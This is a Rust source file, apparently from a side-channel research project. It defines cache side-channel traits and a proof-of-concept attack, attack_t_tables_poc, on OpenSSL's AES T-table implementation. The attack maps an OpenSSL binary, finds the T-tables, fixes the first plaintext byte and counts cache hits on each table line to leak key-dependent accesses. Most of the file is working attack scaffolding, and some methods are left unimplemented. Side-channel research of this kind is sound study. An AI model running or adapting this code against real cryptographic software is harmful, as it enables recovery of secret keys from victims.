#![feature(specialization)]

use openssl::aes;

use crate::CacheStatus::Hit;
use memmap2::Mmap;
use openssl::aes::aes_ige;
use openssl::symm::Mode;
use std::collections::HashMap;
use std::fmt::Debug;
use std::fs::File;
use std::path::Path;
use std::sync::Arc;

// Generic AES T-table attack flow

// Modularisation :
// The module handles loading, then passes the relevant target infos to a attack strategy object for calibration
// Then the module runs the attack, calling the attack strategy to make a measurement and return hit/miss

// interface for attack : run victim (eat a closure)
// interface for measure : give measurement target.

// Can attack strategies return err ?

// Load a vulnerable openssl - determine adresses af the T tables ?
// Run the calibrations
// Then start the attacks

// This is a serialized attack - either single threaded or synchronised

// parameters required

// an attacker measurement
// a calibration victim
#[derive(Debug, PartialEq, Eq)]
pub enum CacheStatus {
    Hit,
    Miss,
}

pub enum ChannelFatalError {
    Oops,
}

pub enum SideChannelError {
    NeedRecalibration,
    FatalError(ChannelFatalError),
}

/*
pub enum CacheSideChannel {
    SingleAddr,
    MultipleAddr,
}
*/

// Access Driven

pub trait SimpleCacheSideChannel {
    // TODO
}

pub trait TableCacheSideChannel {
    //type ChannelFatalError: Debug;
    fn calibrate(&mut self, addresses: impl IntoIterator<Item = *const u8> + Clone);
    fn attack<'a, 'b, 'c>(
        &'a mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
        victim: &'c dyn Fn(),
    ) -> Result<Vec<(*const u8, CacheStatus)>, ChannelFatalError>;
}

pub trait SingleAddrCacheSideChannel: Debug {
    //type SingleChannelFatalError: Debug;

    fn test(&mut self, addr: *const u8) -> Result<CacheStatus, SideChannelError>;
    fn prepare(&mut self, addr: *const u8);
    fn victim(&mut self, operation: &dyn Fn());
    fn calibrate(
        &mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
    ) -> Result<(), ChannelFatalError>;
}

pub trait MultipleAddrCacheSideChannel: Debug {
    //type MultipleChannelFatalError: Debug;

    fn test(
        &mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
    ) -> Result<Vec<(*const u8, CacheStatus)>, SideChannelError>;
    fn prepare(&mut self, addresses: impl IntoIterator<Item = *const u8> + Clone);
    fn victim(&mut self, operation: &dyn Fn());
    fn calibrate(
        &mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
    ) -> Result<(), ChannelFatalError>;
}

impl<T: SingleAddrCacheSideChannel> TableCacheSideChannel for T {
    default fn calibrate(&mut self, addresses: impl IntoIterator<Item = *const u8> + Clone) {
        self.calibrate(addresses);
    }
    //type ChannelFatalError = T::SingleChannelFatalError;

    default fn attack<'a, 'b, 'c>(
        &'a mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
        victim: &'c dyn Fn(),
    ) -> Result<Vec<(*const u8, CacheStatus)>, ChannelFatalError> {
        let mut result = Vec::new();

        for addr in addresses {
            self.prepare(addr);
            self.victim(victim);
            let r = self.test(addr);
            match r {
                Ok(status) => {
                    result.push((addr, status));
                }
                Err(e) => match e {
                    SideChannelError::NeedRecalibration => panic!(),
                    SideChannelError::FatalError(e) => {
                        return Err(e);
                    }
                },
            }
        }
        Ok(result)
    }
}

impl<T: MultipleAddrCacheSideChannel> SingleAddrCacheSideChannel for T {
    //type SingleChannelFatalError = T::MultipleChannelFatalError;
    fn test(&mut self, addr: *const u8) -> Result<CacheStatus, SideChannelError> {
        unimplemented!()
    }

    fn prepare(&mut self, addr: *const u8) {
        unimplemented!()
    }

    fn victim(&mut self, operation: &dyn Fn()) {
        unimplemented!()
    }

    fn calibrate(
        &mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
    ) -> Result<(), ChannelFatalError> {
        self.calibrate(addresses)
    }
}

impl<T: MultipleAddrCacheSideChannel> TableCacheSideChannel for T {
    fn calibrate(&mut self, addresses: impl IntoIterator<Item = *const u8> + Clone) {
        self.calibrate(addresses);
    }
    //type ChannelFatalError = T::MultipleChannelFatalError;

    fn attack<'a, 'b, 'c>(
        &'a mut self,
        addresses: impl IntoIterator<Item = *const u8> + Clone,
        victim: &'c dyn Fn(),
    ) -> Result<Vec<(*const u8, CacheStatus)>, ChannelFatalError> {
        MultipleAddrCacheSideChannel::prepare(self, addresses.clone());
        MultipleAddrCacheSideChannel::victim(self, victim);
        let r = MultipleAddrCacheSideChannel::test(self, addresses); // Fixme error handling
        match r {
            Err(e) => match e {
                SideChannelError::NeedRecalibration => {
                    panic!();
                }
                SideChannelError::FatalError(e) => Err(e),
            },
            Ok(v) => Ok(v),
        }
    }
}

pub struct AESTTableParams<'a> {
    pub num_encryptions: u32,
    pub key: [u8; 32],
    pub openssl_path: &'a Path,
    pub te: [isize; 4],
}

const LEN: usize = (u8::max_value() as usize) + 1;

pub fn attack_t_tables_poc(
    side_channel: &mut impl TableCacheSideChannel,
    parameters: AESTTableParams,
) -> () {
    // Note : This function doesn't handle the case where the address space is not shared. (Additionally you have the issue of complicated eviction sets due to complex addressing)
    // TODO

    // Possible enhancements : use ability to monitor several addresses simultaneously.
    let fd = File::open(parameters.openssl_path).unwrap();
    let mmap = unsafe { Mmap::map(&fd).unwrap() };
    let base = mmap.as_ptr();

    let te0 = unsafe { base.offset(parameters.te[0]) };
    if unsafe { (te0 as *const u64).read() } != 0xf87c7c84c66363a5 {
        panic!("Hmm This does not look like a T-table, check your address and the openssl used")
    }

    let key_struct = aes::AesKey::new_encrypt(&parameters.key).unwrap();

    //let mut plaintext = [0u8; 16];
    //let mut result = [0u8; 16];

    let mut timings: HashMap<*const u8, HashMap<u8, u32>> = HashMap::new();

    let addresses = parameters
        .te
        .iter()
        .map(|&start| ((start)..(start + 64 * 16)).step_by(64))
        .flatten()
        .map(|offset| unsafe { base.offset(offset) });

    side_channel.calibrate(addresses.clone());

    for addr in addresses.clone() {
        timings.insert(addr, HashMap::new());
    }

    for b in (u8::min_value()..=u8::max_value()).step_by(16) {
        //plaintext[0] = b;
        eprintln!("Probing with b = {:x}", b);
        // fixme magic numbers

        let victim = || {
            let mut plaintext = [0u8; 16];
            plaintext[0] = b;
            for i in 1..plaintext.len() {
                plaintext[i] = rand::random();
            }
            let mut iv = [0u8; 32];
            let mut result = [0u8; 16];
            aes_ige(&plaintext, &mut result, &key_struct, &mut iv, Mode::Encrypt);
        };
        for i in 0..parameters.num_encryptions {
            let r = side_channel.attack(addresses.clone(), &victim);
            match r {
                Ok(v) => {
                    //println!("{:?}", v)
                    for (probe, status) in v {
                        if status == Hit {
                            *timings.get_mut(&probe).unwrap().entry(b).or_insert(0) += 1;
                        }
                    }
                }
                Err(_) => panic!("Attack failed"),
            }
        }
    }
    for probe in addresses {
        print!("{:p}", probe);
        for b in (u8::min_value()..=u8::max_value()).step_by(16) {
            print!(" {}", timings[&probe][&b]);
        }
        println!();
    }
}
